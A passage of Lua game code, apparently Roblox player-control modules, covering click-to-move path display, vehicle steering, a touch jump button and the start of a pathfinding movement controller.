				{ Rotation = -10 })
			tweenRotate:Play()

			tweenSideToSide.Completed:wait()

			-- Tween back to center
			tweenInfo = TweenInfo.new(FAILURE_TWEEN_LENGTH/2, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
			local tweenCenter = TweenService:Create(self.DisplayModel.FailureWaypointBillboard, tweenInfo,
				{ SizeOffset = FAIL_WAYPOINT_SIZE_OFFSET_CENTER })
			tweenCenter:Play()

			local tweenRoation = TweenService:Create(self.DisplayModel.FailureWaypointBillboard.Frame, tweenInfo,
				{ Rotation = 0 })
			tweenRoation:Play()

			tweenCenter.Completed:wait()

			wait(FAILURE_TWEEN_LENGTH) -- Delay one tween length betfore removing
		end

		function FailureWaypoint.new(position)
			local self = setmetatable({}, FailureWaypoint)

			self.DisplayModel = self:NewDisplayModel(position)

			return self
		end

		local failureAnimation = Instance.new("Animation")
		failureAnimation.AnimationId = FAILURE_ANIMATION_ID

		local lastHumanoid = nil
		local lastFailureAnimationTrack = nil

		local function getFailureAnimationTrack(myHumanoid)
			if myHumanoid == lastHumanoid then
				return lastFailureAnimationTrack
			end
			lastFailureAnimationTrack = myHumanoid:LoadAnimation(failureAnimation)
			lastFailureAnimationTrack.Priority = Enum.AnimationPriority.Action
			lastFailureAnimationTrack.Looped = false
			return lastFailureAnimationTrack
		end

		local function findPlayerHumanoid()
			local character = LocalPlayer.Character
			if character then
				return character:FindFirstChildOfClass("Humanoid")
			end
		end

		local function createTrailDots(wayPoints, originalEndWaypoint)
			local newTrailDots = {}
			local count = 1
			for i = 1, #wayPoints - 1 do
				local closeToEnd = (wayPoints[i].Position - wayPoints[#wayPoints].Position).magnitude < LAST_DOT_DISTANCE
				local includeWaypoint = i % WAYPOINT_INCLUDE_FACTOR == 0 and not closeToEnd
				if includeWaypoint then
					local trailDot = TrailDot.new(wayPoints[i].Position, i)
					newTrailDots[count] = trailDot
					count = count + 1
				end
			end

			local newEndWaypoint = EndWaypoint.new(wayPoints[#wayPoints].Position, #wayPoints, originalEndWaypoint)
			table.insert(newTrailDots, newEndWaypoint)

			local reversedTrailDots = {}
			count = 1
			for i = #newTrailDots, 1, -1 do
				reversedTrailDots[count] = newTrailDots[i]
				count = count + 1
			end
			return reversedTrailDots
		end

		local function getTrailDotScale(distanceToCamera, defaultSize)
			local rangeLength = TRAIL_DOT_MAX_DISTANCE - TRAIL_DOT_MIN_DISTANCE
			local inRangePoint = math.clamp(distanceToCamera - TRAIL_DOT_MIN_DISTANCE, 0, rangeLength)/rangeLength
			local scale = TRAIL_DOT_MIN_SCALE + (TRAIL_DOT_MAX_SCALE - TRAIL_DOT_MIN_SCALE)*inRangePoint
			return defaultSize * scale
		end

		local createPathCount = 0
		-- originalEndWaypoint is optional, causes the waypoint to tween from that position.
		function ClickToMoveDisplay.CreatePathDisplay(wayPoints, originalEndWaypoint)
			createPathCount = createPathCount + 1
			local trailDots = createTrailDots(wayPoints, originalEndWaypoint)

			local function removePathBeforePoint(wayPointNumber)
				-- kill all trailDots before and at wayPointNumber
				for i = #trailDots, 1, -1 do
					local trailDot = trailDots[i]
					if trailDot.ClosestWayPoint <= wayPointNumber then
						trailDot:Destroy()
						trailDots[i] = nil
					else
						break
					end
				end
			end

			local reiszeTrailDotsUpdateName = "ClickToMoveResizeTrail" ..createPathCount
			local function resizeTrailDots()
				if #trailDots == 0 then
					RunService:UnbindFromRenderStep(reiszeTrailDotsUpdateName)
					return
				end
				local cameraPos = Workspace.CurrentCamera.CFrame.p
				for i = 1, #trailDots do
					local trailDotImage = trailDots[i].DisplayModel:FindFirstChild("TrailDotImage")
					if trailDotImage then
						local distanceToCamera = (trailDots[i].DisplayModel.Position - cameraPos).magnitude
						trailDotImage.Size = getTrailDotScale(distanceToCamera, TrailDotSize)
					end
				end
			end
			RunService:BindToRenderStep(reiszeTrailDotsUpdateName, Enum.RenderPriority.Camera.Value - 1, resizeTrailDots)

			local function removePath()
				removePathBeforePoint(#wayPoints)
			end

			return removePath, removePathBeforePoint
		end

		local lastFailureWaypoint = nil
		function ClickToMoveDisplay.DisplayFailureWaypoint(position)
			if lastFailureWaypoint then
				lastFailureWaypoint:Hide()
			end
			local failureWaypoint = FailureWaypoint.new(position)
			lastFailureWaypoint = failureWaypoint
			coroutine.wrap(function()
				failureWaypoint:RunFailureTween()
				failureWaypoint:Destroy()
				failureWaypoint = nil
			end)()
		end

		function ClickToMoveDisplay.CreateEndWaypoint(position)
			return EndWaypoint.new(position)
		end

		function ClickToMoveDisplay.PlayFailureAnimation()
			local myHumanoid = findPlayerHumanoid()
			if myHumanoid then
				local animationTrack = getFailureAnimationTrack(myHumanoid)
				animationTrack:Play()
			end
		end

		function ClickToMoveDisplay.CancelFailureAnimation()
			if lastFailureAnimationTrack ~= nil and lastFailureAnimationTrack.IsPlaying then
				lastFailureAnimationTrack:Stop()
			end
		end

		function ClickToMoveDisplay.SetWaypointTexture(texture)
			TrailDotIcon = texture
			TrailDotTemplate, EndWaypointTemplate, FailureWaypointTemplate = CreateWaypointTemplates()
		end

		function ClickToMoveDisplay.GetWaypointTexture()
			return TrailDotIcon
		end

		function ClickToMoveDisplay.SetWaypointRadius(radius)
			TrailDotSize = Vector2.new(radius, radius)
			TrailDotTemplate, EndWaypointTemplate, FailureWaypointTemplate = CreateWaypointTemplates()
		end

		function ClickToMoveDisplay.GetWaypointRadius()
			return TrailDotSize.X
		end

		function ClickToMoveDisplay.SetEndWaypointTexture(texture)
			EndWaypointIcon = texture
			TrailDotTemplate, EndWaypointTemplate, FailureWaypointTemplate = CreateWaypointTemplates()
		end

		function ClickToMoveDisplay.GetEndWaypointTexture()
			return EndWaypointIcon
		end

		function ClickToMoveDisplay.SetWaypointsAlwaysOnTop(alwaysOnTop)
			WaypointsAlwaysOnTop = alwaysOnTop
			TrailDotTemplate, EndWaypointTemplate, FailureWaypointTemplate = CreateWaypointTemplates()
		end

		function ClickToMoveDisplay.GetWaypointsAlwaysOnTop()
			return WaypointsAlwaysOnTop
		end

		return ClickToMoveDisplay
	end

	function _BaseCharacterController()

		local ZERO_VECTOR3 = Vector3.new(0,0,0)

		--[[ The Module ]]--
		local BaseCharacterController = {}
		BaseCharacterController.__index = BaseCharacterController

		function BaseCharacterController.new()
			local self = setmetatable({}, BaseCharacterController)
			self.enabled = false
			self.moveVector = ZERO_VECTOR3
			self.moveVectorIsCameraRelative = true
			self.isJumping = false
			return self
		end

		function BaseCharacterController:OnRenderStepped(dt)
			-- By default, nothing to do
		end

		function BaseCharacterController:GetMoveVector()
			return self.moveVector
		end

		function BaseCharacterController:IsMoveVectorCameraRelative()
			return self.moveVectorIsCameraRelative
		end

		function BaseCharacterController:GetIsJumping()
			return self.isJumping
		end

		-- Override in derived classes to set self.enabled and return boolean indicating
		-- whether Enable/Disable was successful. Return true if controller is already in the requested state.
		function BaseCharacterController:Enable(enable)
			error("BaseCharacterController:Enable must be overridden in derived classes and should not be called.")
			return false
		end

		return BaseCharacterController
	end

	function _VehicleController()
		local ContextActionService = game:GetService("ContextActionService")

		--[[ Constants ]]--
		-- Set this to true if you want to instead use the triggers for the throttle
		local useTriggersForThrottle = true
		-- Also set this to true if you want the thumbstick to not affect throttle, only triggers when a gamepad is conected
		local onlyTriggersForThrottle = false
		local ZERO_VECTOR3 = Vector3.new(0,0,0)

		local AUTO_PILOT_DEFAULT_MAX_STEERING_ANGLE = 35


		-- Note that VehicleController does not derive from BaseCharacterController, it is a special case
		local VehicleController = {}
		VehicleController.__index = VehicleController

		function VehicleController.new(CONTROL_ACTION_PRIORITY)
			local self = setmetatable({}, VehicleController)

			self.CONTROL_ACTION_PRIORITY = CONTROL_ACTION_PRIORITY

			self.enabled = false
			self.vehicleSeat = nil
			self.throttle = 0
			self.steer = 0

			self.acceleration = 0
			self.decceleration = 0
			self.turningRight = 0
			self.turningLeft = 0

			self.vehicleMoveVector = ZERO_VECTOR3

			self.autoPilot = {}
			self.autoPilot.MaxSpeed = 0
			self.autoPilot.MaxSteeringAngle = 0

			return self
		end

		function VehicleController:BindContextActions()
			if useTriggersForThrottle then
				ContextActionService:BindActionAtPriority("throttleAccel", (function(actionName, inputState, inputObject)
					self:OnThrottleAccel(actionName, inputState, inputObject)
					return Enum.ContextActionResult.Pass
				end), false, self.CONTROL_ACTION_PRIORITY, Enum.KeyCode.ButtonR2)
				ContextActionService:BindActionAtPriority("throttleDeccel", (function(actionName, inputState, inputObject)
					self:OnThrottleDeccel(actionName, inputState, inputObject)
					return Enum.ContextActionResult.Pass
				end), false, self.CONTROL_ACTION_PRIORITY, Enum.KeyCode.ButtonL2)
			end
			ContextActionService:BindActionAtPriority("arrowSteerRight", (function(actionName, inputState, inputObject)
				self:OnSteerRight(actionName, inputState, inputObject)
				return Enum.ContextActionResult.Pass
			end), false, self.CONTROL_ACTION_PRIORITY, Enum.KeyCode.Right)
			ContextActionService:BindActionAtPriority("arrowSteerLeft", (function(actionName, inputState, inputObject)
				self:OnSteerLeft(actionName, inputState, inputObject)
				return Enum.ContextActionResult.Pass
			end), false, self.CONTROL_ACTION_PRIORITY, Enum.KeyCode.Left)
		end

		function VehicleController:Enable(enable, vehicleSeat)
			if enable == self.enabled and vehicleSeat == self.vehicleSeat then
				return
			end

			self.enabled = enable
			self.vehicleMoveVector = ZERO_VECTOR3

			if enable then
				if vehicleSeat then
					self.vehicleSeat = vehicleSeat

					self:SetupAutoPilot()
					self:BindContextActions()
				end
			else
				if useTriggersForThrottle then
					ContextActionService:UnbindAction("throttleAccel")
					ContextActionService:UnbindAction("throttleDeccel")
				end
				ContextActionService:UnbindAction("arrowSteerRight")
				ContextActionService:UnbindAction("arrowSteerLeft")
				self.vehicleSeat = nil
			end
		end

		function VehicleController:OnThrottleAccel(actionName, inputState, inputObject)
			if inputState == Enum.UserInputState.End or inputState == Enum.UserInputState.Cancel then
				self.acceleration = 0
			else
				self.acceleration = -1
			end
			self.throttle = self.acceleration + self.decceleration
		end

		function VehicleController:OnThrottleDeccel(actionName, inputState, inputObject)
			if inputState == Enum.UserInputState.End or inputState == Enum.UserInputState.Cancel then
				self.decceleration = 0
			else
				self.decceleration = 1
			end
			self.throttle = self.acceleration + self.decceleration
		end

		function VehicleController:OnSteerRight(actionName, inputState, inputObject)
			if inputState == Enum.UserInputState.End or inputState == Enum.UserInputState.Cancel then
				self.turningRight = 0
			else
				self.turningRight = 1
			end
			self.steer = self.turningRight + self.turningLeft
		end

		function VehicleController:OnSteerLeft(actionName, inputState, inputObject)
			if inputState == Enum.UserInputState.End or inputState == Enum.UserInputState.Cancel then
				self.turningLeft = 0
			else
				self.turningLeft = -1
			end
			self.steer = self.turningRight + self.turningLeft
		end

		-- Call this from a function bound to Renderstep with Input Priority
		function VehicleController:Update(moveVector, cameraRelative, usingGamepad)
			if self.vehicleSeat then
				if cameraRelative then
					-- This is the default steering mode
					moveVector = moveVector + Vector3.new(self.steer, 0, self.throttle)
					if usingGamepad and onlyTriggersForThrottle and useTriggersForThrottle then
						self.vehicleSeat.ThrottleFloat = -self.throttle
					else
						self.vehicleSeat.ThrottleFloat = -moveVector.Z
					end
					self.vehicleSeat.SteerFloat = moveVector.X

					return moveVector, true
				else
					-- This is the path following mode
					local localMoveVector = self.vehicleSeat.Occupant.RootPart.CFrame:VectorToObjectSpace(moveVector)

					self.vehicleSeat.ThrottleFloat = self:ComputeThrottle(localMoveVector)
					self.vehicleSeat.SteerFloat = self:ComputeSteer(localMoveVector)

					return ZERO_VECTOR3, true
				end
			end
			return moveVector, false
		end

		function VehicleController:ComputeThrottle(localMoveVector)
			if localMoveVector ~= ZERO_VECTOR3 then
				local throttle = -localMoveVector.Z
				return throttle
			else
				return 0.0
			end
		end

		function VehicleController:ComputeSteer(localMoveVector)
			if localMoveVector ~= ZERO_VECTOR3 then
				local steerAngle = -math.atan2(-localMoveVector.x, -localMoveVector.z) * (180 / math.pi)
				return steerAngle / self.autoPilot.MaxSteeringAngle
			else
				return 0.0
			end
		end

		function VehicleController:SetupAutoPilot()
			-- Setup default
			self.autoPilot.MaxSpeed = self.vehicleSeat.MaxSpeed
			self.autoPilot.MaxSteeringAngle = AUTO_PILOT_DEFAULT_MAX_STEERING_ANGLE

			-- VehicleSeat should have a MaxSteeringAngle as well.
			-- Or we could look for a child "AutoPilotConfigModule" to find these values
			-- Or allow developer to set them through the API as like the CLickToMove customization API
		end

		return VehicleController
	end

	function _TouchJump()

		local Players = game:GetService("Players")
		local GuiService = game:GetService("GuiService")

		--[[ Constants ]]--
		local TOUCH_CONTROL_SHEET = "rbxasset://textures/ui/Input/TouchControlsSheetV2.png"

		--[[ The Module ]]--
		local BaseCharacterController = _BaseCharacterController()
		local TouchJump = setmetatable({}, BaseCharacterController)
		TouchJump.__index = TouchJump

		function TouchJump.new()
			local self = setmetatable(BaseCharacterController.new(), TouchJump)

			self.parentUIFrame = nil
			self.jumpButton = nil
			self.characterAddedConn = nil
			self.humanoidStateEnabledChangedConn = nil
			self.humanoidJumpPowerConn = nil
			self.humanoidParentConn = nil
			self.externallyEnabled = false
			self.jumpPower = 0
			self.jumpStateEnabled = true
			self.isJumping = false
			self.humanoid = nil -- saved reference because property change connections are made using it

			return self
		end

		function TouchJump:EnableButton(enable)
			if enable then
				if not self.jumpButton then
					self:Create()
				end
				local humanoid = Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
				if humanoid and self.externallyEnabled then
					if self.externallyEnabled then
						if humanoid.JumpPower > 0 then
							self.jumpButton.Visible = true
						end
					end
				end
			else
				self.jumpButton.Visible = false
				self.isJumping = false
				self.jumpButton.ImageRectOffset = Vector2.new(1, 146)
			end
		end

		function TouchJump:UpdateEnabled()
			if self.jumpPower > 0 and self.jumpStateEnabled then
				self:EnableButton(true)
			else
				self:EnableButton(false)
			end
		end

		function TouchJump:HumanoidChanged(prop)
			local humanoid = Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
			if humanoid then
				if prop == "JumpPower" then
					self.jumpPower =  humanoid.JumpPower
					self:UpdateEnabled()
				elseif prop == "Parent" then
					if not humanoid.Parent then
						self.humanoidChangeConn:Disconnect()
					end
				end
			end
		end

		function TouchJump:HumanoidStateEnabledChanged(state, isEnabled)
			if state == Enum.HumanoidStateType.Jumping then
				self.jumpStateEnabled = isEnabled
				self:UpdateEnabled()
			end
		end

		function TouchJump:CharacterAdded(char)
			if self.humanoidChangeConn then
				self.humanoidChangeConn:Disconnect()
				self.humanoidChangeConn = nil
			end

			self.humanoid = char:FindFirstChildOfClass("Humanoid")
			while not self.humanoid do
				char.ChildAdded:wait()
				self.humanoid = char:FindFirstChildOfClass("Humanoid")
			end

			self.humanoidJumpPowerConn = self.humanoid:GetPropertyChangedSignal("JumpPower"):Connect(function()
				self.jumpPower =  self.humanoid.JumpPower
				self:UpdateEnabled()
			end)

			self.humanoidParentConn = self.humanoid:GetPropertyChangedSignal("Parent"):Connect(function()
				if not self.humanoid.Parent then
					self.humanoidJumpPowerConn:Disconnect()
					self.humanoidJumpPowerConn = nil
					self.humanoidParentConn:Disconnect()
					self.humanoidParentConn = nil
				end
			end)

			self.humanoidStateEnabledChangedConn = self.humanoid.StateEnabledChanged:Connect(function(state, enabled)
				self:HumanoidStateEnabledChanged(state, enabled)
			end)

			self.jumpPower = self.humanoid.JumpPower
			self.jumpStateEnabled = self.humanoid:GetStateEnabled(Enum.HumanoidStateType.Jumping)
			self:UpdateEnabled()
		end

		function TouchJump:SetupCharacterAddedFunction()
			self.characterAddedConn = Players.LocalPlayer.CharacterAdded:Connect(function(char)
				self:CharacterAdded(char)
			end)
			if Players.LocalPlayer.Character then
				self:CharacterAdded(Players.LocalPlayer.Character)
			end
		end

		function TouchJump:Enable(enable, parentFrame)
			if parentFrame then
				self.parentUIFrame = parentFrame
			end
			self.externallyEnabled = enable
			self:EnableButton(enable)
		end

		function TouchJump:Create()
			if not self.parentUIFrame then
				return
			end

			if self.jumpButton then
				self.jumpButton:Destroy()
				self.jumpButton = nil
			end

			local minAxis = math.min(self.parentUIFrame.AbsoluteSize.x, self.parentUIFrame.AbsoluteSize.y)
			local isSmallScreen = minAxis <= 500
			local jumpButtonSize = isSmallScreen and 70 or 120

			self.jumpButton = Instance.new("ImageButton")
			self.jumpButton.Name = "JumpButton"
			self.jumpButton.Visible = false
			self.jumpButton.BackgroundTransparency = 1
			self.jumpButton.Image = TOUCH_CONTROL_SHEET
			self.jumpButton.ImageRectOffset = Vector2.new(1, 146)
			self.jumpButton.ImageRectSize = Vector2.new(144, 144)
			self.jumpButton.Size = UDim2.new(0, jumpButtonSize, 0, jumpButtonSize)

			self.jumpButton.Position = isSmallScreen and UDim2.new(1, -(jumpButtonSize*1.5-10), 1, -jumpButtonSize - 20) or
				UDim2.new(1, -(jumpButtonSize*1.5-10), 1, -jumpButtonSize * 1.75)

			local touchObject = nil
			self.jumpButton.InputBegan:connect(function(inputObject)
				--A touch that starts elsewhere on the screen will be sent to a frame's InputBegan event
				--if it moves over the frame. So we check that this is actually a new touch (inputObject.UserInputState ~= Enum.UserInputState.Begin)
				if touchObject or inputObject.UserInputType ~= Enum.UserInputType.Touch
					or inputObject.UserInputState ~= Enum.UserInputState.Begin then
					return
				end

				touchObject = inputObject
				self.jumpButton.ImageRectOffset = Vector2.new(146, 146)
				self.isJumping = true
			end)

			local OnInputEnded = function()
				touchObject = nil
				self.isJumping = false
				self.jumpButton.ImageRectOffset = Vector2.new(1, 146)
			end

			self.jumpButton.InputEnded:connect(function(inputObject)
				if inputObject == touchObject then
					OnInputEnded()
				end
			end)

			GuiService.MenuOpened:connect(function()
				if touchObject then
					OnInputEnded()
				end
			end)

			if not self.characterAddedConn then
				self:SetupCharacterAddedFunction()
			end

			self.jumpButton.Parent = self.parentUIFrame
		end

		return TouchJump
	end

	function _ClickToMoveController()
		--[[ Roblox Services ]]--
		local UserInputService = game:GetService("UserInputService")
		local PathfindingService = game:GetService("PathfindingService")
		local Players = game:GetService("Players")
		local DebrisService = game:GetService('Debris')
		local StarterGui = game:GetService("StarterGui")
		local Workspace = game:GetService("Workspace")
		local CollectionService = game:GetService("CollectionService")
		local GuiService = game:GetService("GuiService")

		--[[ Configuration ]]
		local ShowPath = true
		local PlayFailureAnimation = true
		local UseDirectPath = false
		local UseDirectPathForVehicle = true
		local AgentSizeIncreaseFactor = 1.0
		local UnreachableWaypointTimeout = 8

		--[[ Constants ]]--
		local movementKeys = {
			[Enum.KeyCode.W] = true;
			[Enum.KeyCode.A] = true;
			[Enum.KeyCode.S] = true;
			[Enum.KeyCode.D] = true;
			[Enum.KeyCode.Up] = true;
			[Enum.KeyCode.Down] = true;
		}

		local FFlagUserNavigationClickToMoveSkipPassedWaypointsSuccess, FFlagUserNavigationClickToMoveSkipPassedWaypointsResult = pcall(function() return UserSettings():IsUserFeatureEnabled("UserNavigationClickToMoveSkipPassedWaypoints") end)
		local FFlagUserNavigationClickToMoveSkipPassedWaypoints = FFlagUserNavigationClickToMoveSkipPassedWaypointsSuccess and FFlagUserNavigationClickToMoveSkipPassedWaypointsResult

		local Player = Players.LocalPlayer

		local ClickToMoveDisplay = _ClickToMoveDisplay()

		local ZERO_VECTOR3 = Vector3.new(0,0,0)
		local ALMOST_ZERO = 0.000001


		--------------------------UTIL LIBRARY-------------------------------
		local Utility = {}
		do
			local function FindCharacterAncestor(part)
				if part then
					local humanoid = part:FindFirstChildOfClass("Humanoid")
					if humanoid then
						return part, humanoid
					else
						return FindCharacterAncestor(part.Parent)
					end
				end
			end
			Utility.FindCharacterAncestor = FindCharacterAncestor

			local function Raycast(ray, ignoreNonCollidable, ignoreList)
				ignoreList = ignoreList or {}
				local hitPart, hitPos, hitNorm, hitMat = Workspace:FindPartOnRayWithIgnoreList(ray, ignoreList)
				if hitPart then
					if ignoreNonCollidable and hitPart.CanCollide == false then
						-- We always include character parts so a user can click on another character
						-- to walk to them.
						local _, humanoid = FindCharacterAncestor(hitPart)
						if humanoid == nil then
							table.insert(ignoreList, hitPart)
							return Raycast(ray, ignoreNonCollidable, ignoreList)
						end
					end
					return hitPart, hitPos, hitNorm, hitMat
				end
				return nil, nil
			end
			Utility.Raycast = Raycast
		end

		local humanoidCache = {}
		local function findPlayerHumanoid(player)
			local character = player and player.Character
			if character then
				local resultHumanoid = humanoidCache[player]
				if resultHumanoid and resultHumanoid.Parent == character then
					return resultHumanoid
				else
					humanoidCache[player] = nil -- Bust Old Cache
					local humanoid = character:FindFirstChildOfClass("Humanoid")
					if humanoid then
						humanoidCache[player] = humanoid
					end
					return humanoid
				end
			end
		end

		--------------------------CHARACTER CONTROL-------------------------------
		local CurrentIgnoreList
		local CurrentIgnoreTag = nil

		local TaggedInstanceAddedConnection = nil
		local TaggedInstanceRemovedConnection = nil

		local function GetCharacter()
			return Player and Player.Character
		end

		local function UpdateIgnoreTag(newIgnoreTag)
			if newIgnoreTag == CurrentIgnoreTag then
				return
			end
			if TaggedInstanceAddedConnection then
				TaggedInstanceAddedConnection:Disconnect()
				TaggedInstanceAddedConnection = nil
			end
			if TaggedInstanceRemovedConnection then
				TaggedInstanceRemovedConnection:Disconnect()
				TaggedInstanceRemovedConnection = nil
			end
			CurrentIgnoreTag = newIgnoreTag
			CurrentIgnoreList = {GetCharacter()}
			if CurrentIgnoreTag ~= nil then
				local ignoreParts = CollectionService:GetTagged(CurrentIgnoreTag)
				for _, ignorePart in ipairs(ignoreParts) do
					table.insert(CurrentIgnoreList, ignorePart)
				end
				TaggedInstanceAddedConnection = CollectionService:GetInstanceAddedSignal(
					CurrentIgnoreTag):Connect(function(ignorePart)
					table.insert(CurrentIgnoreList, ignorePart)
				end)
				TaggedInstanceRemovedConnection = CollectionService:GetInstanceRemovedSignal(
					CurrentIgnoreTag):Connect(function(ignorePart)
					for i = 1, #CurrentIgnoreList do
						if CurrentIgnoreList[i] == ignorePart then
							CurrentIgnoreList[i] = CurrentIgnoreList[#CurrentIgnoreList]
							table.remove(CurrentIgnoreList)
							break
						end
					end
				end)
			end
		end

		local function getIgnoreList()
			if CurrentIgnoreList then
				return CurrentIgnoreList
			end
			CurrentIgnoreList = {}
			table.insert(CurrentIgnoreList, GetCharacter())
			return CurrentIgnoreList
		end

		-----------------------------------PATHER--------------------------------------

		local function Pather(endPoint, surfaceNormal, overrideUseDirectPath)
			local this = {}

			local directPathForHumanoid
			local directPathForVehicle
			if overrideUseDirectPath ~= nil then
				directPathForHumanoid = overrideUseDirectPath
				directPathForVehicle = overrideUseDirectPath
			else
				directPathForHumanoid = UseDirectPath
				directPathForVehicle = UseDirectPathForVehicle
			end

			this.Cancelled = false
			this.Started = false

			this.Finished = Instance.new("BindableEvent")
			this.PathFailed = Instance.new("BindableEvent")

			this.PathComputing = false
			this.PathComputed = false

			this.OriginalTargetPoint = endPoint
			this.TargetPoint = endPoint
			this.TargetSurfaceNormal = surfaceNormal

			this.DiedConn = nil
			this.SeatedConn = nil
			this.BlockedConn = nil
			this.TeleportedConn = nil

			this.CurrentPoint = 0

			this.HumanoidOffsetFromPath = ZERO_VECTOR3

			this.CurrentWaypointPosition = nil
			this.CurrentWaypointPlaneNormal = ZERO_VECTOR3
			this.CurrentWaypointPlaneDistance = 0
			this.CurrentWaypointNeedsJump = false;

			this.CurrentHumanoidPosition = ZERO_VECTOR3
			this.CurrentHumanoidVelocity = 0

			this.NextActionMoveDirection = ZERO_VECTOR3
			this.NextActionJump = false

			this.Timeout = 0

			this.Humanoid = findPlayerHumanoid(Player)
			this.OriginPoint = nil
			this.AgentCanFollowPath = false
			this.DirectPath = false
			this.DirectPathRiseFirst = false

			local rootPart = this.Humanoid and this.Humanoid.RootPart
			if rootPart then
				-- Setup origin
				this.OriginPoint = rootPart.CFrame.p

				-- Setup agent
				local agentRadius = 2
				local agentHeight = 5
				local agentCanJump = true

				local seat = this.Humanoid.SeatPart
				if seat and seat:IsA("VehicleSeat") then
					-- Humanoid is seated on a vehicle
					local vehicle = seat:FindFirstAncestorOfClass("Model")
					if vehicle then
						-- Make sure the PrimaryPart is set to the vehicle seat while we compute the extends.
						local tempPrimaryPart = vehicle.PrimaryPart
						vehicle.PrimaryPart = seat

						-- For now, only direct path
						if directPathForVehicle then
							local extents = vehicle:GetExtentsSize()
							agentRadius = AgentSizeIncreaseFactor * 0.5 * math.sqrt(extents.X * extents.X + extents.Z * extents.Z)
							agentHeight = AgentSizeIncreaseFactor * extents.Y
							agentCanJump = false
							this.AgentCanFollowPath = true
							this.DirectPath = directPathForVehicle
						end

						-- Reset PrimaryPart
						vehicle.PrimaryPart = tempPrimaryPart
					end
				else
					local extents = GetCharacter():GetExtentsSize()
					agentRadius = AgentSizeIncreaseFactor * 0.5 * math.sqrt(extents.X * extents.X + extents.Z * extents.Z)
					agentHeight = AgentSizeIncreaseFactor * extents.Y
					agentCanJump = (this.Humanoid.JumpPower > 0)
					this.AgentCanFollowPath = true
					this.DirectPath = directPathForHumanoid
					this.DirectPathRiseFirst = this.Humanoid.Sit
				end

				-- Build path object
				this.pathResult = PathfindingService:CreatePath({AgentRadius = agentRadius, AgentHeight = agentHeight, AgentCanJump = agentCanJump})
			end

			function this:Cleanup()
				if this.stopTraverseFunc then
					this.stopTraverseFunc()
					this.stopTraverseFunc = nil
				end

				if this.MoveToConn then
					this.MoveToConn:Disconnect()
					this.MoveToConn = nil
				end

				if this.BlockedConn then
					this.BlockedConn:Disconnect()
					this.BlockedConn = nil
				end

				if this.DiedConn then
					this.DiedConn:Disconnect()
					this.DiedConn = nil
				end

				if this.SeatedConn then
					this.SeatedConn:Disconnect()
					this.SeatedConn = nil
				end

				if this.TeleportedConn then
					this.TeleportedConn:Disconnect()
					this.TeleportedConn = nil
				end

				this.Started = false
			end

			function this:Cancel()
				this.Cancelled = true
				this:Cleanup()
			end

			function this:IsActive()
				return this.AgentCanFollowPath and this.Started and not this.Cancelled
			end

			function this:OnPathInterrupted()
				-- Stop moving
				this.Cancelled = true
				this:OnPointReached(false)
			end

			function this:ComputePath()
				if this.OriginPoint then
					if this.PathComputed or this.PathComputing then return end
					this.PathComputing = true
					if this.AgentCanFollowPath then
						if this.DirectPath then
							this.pointList = {
								PathWaypoint.new(this.OriginPoint, Enum.PathWaypointAction.Walk),
								PathWaypoint.new(this.TargetPoint, this.DirectPathRiseFirst and Enum.PathWaypointAction.Jump or Enum.PathWaypointAction.Walk)
							}
							this.PathComputed = true
						else
							this.pathResult:ComputeAsync(this.OriginPoint, this.TargetPoint)
							this.pointList = this.pathResult:GetWaypoints()
							this.BlockedConn = this.pathResult.Blocked:Connect(function(blockedIdx) this:OnPathBlocked(blockedIdx) end)
							this.PathComputed = this.pathResult.Status == Enum.PathStatus.Success
						end
					end
					this.PathComputing = false
				end
			end

			function this:IsValidPath()
				this:ComputePath()
				return this.PathComputed and this.AgentCanFollowPath
			end

			this.Recomputing = false
			function this:OnPathBlocked(blockedWaypointIdx)
				local pathBlocked = blockedWaypointIdx >= this.CurrentPoint
				if not pathBlocked or this.Recomputing then
					return
				end

				this.Recomputing = true

				if this.stopTraverseFunc then
					this.stopTraverseFunc()
					this.stopTraverseFunc = nil
				end

				this.OriginPoint = this.Humanoid.RootPart.CFrame.p

				this.pathResult:ComputeAsync(this.OriginPoint, this.TargetPoint)
				this.pointList = this.pathResult:GetWaypoints()
				if #this.pointList > 0 then
					this.HumanoidOffsetFromPath = this.pointList[1].Position - this.OriginPoint
				end
				this.PathComputed = this.pathResult.Status == Enum.PathStatus.Success

				if ShowPath then
					this.stopTraverseFunc, this.setPointFunc = ClickToMoveDisplay.CreatePathDisplay(this.pointList)
				end
				if this.PathComputed then
					this.CurrentPoint = 1 -- The first waypoint is always the start location. Skip it.
					this:OnPointReached(true) -- Move to first point
				else
					this.PathFailed:Fire()
					this:Cleanup()
				end

				this.Recomputing = false
			end

			function this:OnRenderStepped(dt)
				if this.Started and not this.Cancelled then
					-- Check for Timeout (if a waypoint is not reached within the delay, we fail)
					this.Timeout = this.Timeout + dt
					if this.Timeout > UnreachableWaypointTimeout then
						this:OnPointReached(false)
						return
					end

					-- Get Humanoid position and velocity
					this.CurrentHumanoidPosition = this.Humanoid.RootPart.Position + this.HumanoidOffsetFromPath
					this.CurrentHumanoidVelocity = this.Humanoid.RootPart.Velocity

					-- Check if it has reached some waypoints
					while this.Started and this:IsCurrentWaypointReached() do
						this:OnPointReached(true)
					end

					-- If still started, update actions
					if this.Started then
						-- Move action
						this.NextActionMoveDirection = this.CurrentWaypointPosition - this.CurrentHumanoidPosition
						if this.NextActionMoveDirection.Magnitude > ALMOST_ZERO then
							this.NextActionMoveDirection = this.NextActionMoveDirection.Unit
						else
							this.NextActionMoveDirection = ZERO_VECTOR3
						end
						-- Jump action
						if this.CurrentWaypointNeedsJump then
							this.NextActionJump = true
							this.CurrentWaypointNeedsJump = false	-- Request jump only once
						else
							this.NextActionJump = false
						end
					end
				end
			end

			function this:IsCurrentWaypointReached()
				local reached = false

				-- Check we do have a plane, if not, we consider the waypoint reached
				if this.CurrentWaypointPlaneNormal ~= ZERO_VECTOR3 then
					-- Compute distance of Humanoid from destination plane
					local dist = this.CurrentWaypointPlaneNormal:Dot(this.CurrentHumanoidPosition) - this.CurrentWaypointPlaneDistance
					-- Compute the component of the Humanoid velocity that is towards the plane
					local velocity = -this.CurrentWaypointPlaneNormal:Dot(this.CurrentHumanoidVelocity)
					-- Compute the threshold from the destination plane based on Humanoid velocity
					local threshold = math.max(1.0, 0.0625 * velocity)
					-- If we are less then threshold in front of the plane (between 0 and threshold) or if we are behing the plane (less then 0), we consider we reached it
					reached = dist < threshold
				else
					reached = true
				end

				if reached then
					this.CurrentWaypointPosition = nil
